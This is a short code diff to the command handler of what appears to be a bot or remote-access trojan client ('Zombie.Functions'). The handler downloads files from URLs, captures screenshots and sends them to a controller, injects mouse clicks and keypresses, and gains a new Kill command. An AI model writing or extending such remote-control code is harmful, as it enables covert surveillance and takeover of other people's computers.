@@ -26,7 +26,7 @@ namespace Zombie.Functions
                     Client.Send(Download.FromURL(reader.ReadString(), reader.ReadString()));
                     break;
                 case CommandFlags.Screenshot:
-                    Client.Send(Screenshot.Take());
+                    Client.Send(Screenshot.Take(reader.ReadString()));
                     break;
                 case CommandFlags.Click:
                     MousePoint mp = InputControl.ConvertScreenPointToCurrent(reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32());
@@ -34,6 +34,9 @@ namespace Zombie.Functions
                     break;
                 case CommandFlags.KeyboardKey:
                     InputControl.KeyboardPress(reader.ReadInt32());
+                    break;
+                case CommandFlags.Kill:
+                    Kill.Request();
                     break;
 
             }
